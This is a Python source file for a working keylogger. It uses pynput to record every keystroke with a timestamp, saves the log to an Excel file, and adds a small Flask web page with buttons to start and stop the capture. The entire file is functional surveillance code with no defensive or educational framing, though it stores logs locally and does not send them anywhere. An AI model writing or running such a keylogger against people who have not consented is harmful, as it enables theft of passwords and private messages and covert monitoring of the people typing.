import pynput
from pynput.keyboard import Listener
import pandas as pd
from datetime import datetime
from flask import Flask, render_template_string, request


keys = []
filename = "keylogs.xlsx"

def on_press(key):
    keys.append({
        "key": str(key),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

def save_to_file():
    df = pd.DataFrame(keys)
    df.to_excel(filename, index=False)

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        save_to_file()
        return False

listener = Listener(on_press=on_press, on_release=on_release)

def start_keylogger():
    global listener
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

def stop_keylogger():
    global listener
    listener.stop()
    save_to_file()

app = Flask(__name__)

html_template = '''
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Keylogger Interface</title>
  </head>
  <body>
    <div style="text-align:center; margin-top:50px;">
      <h1>Keylogger Control</h1>
      <form method="post">
        <button name="action" value="start" type="submit">Start Keylogger</button>
        <button name="action" value="stop" type="submit">Stop Keylogger</button>
      </form>
    </div>
  </body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form['action']
        if action == 'start':
            start_keylogger()
        elif action == 'stop':
            stop_keylogger()
    return render_template_string(html_template)

if __name__ == '__main__':
    app.run(debug=True)
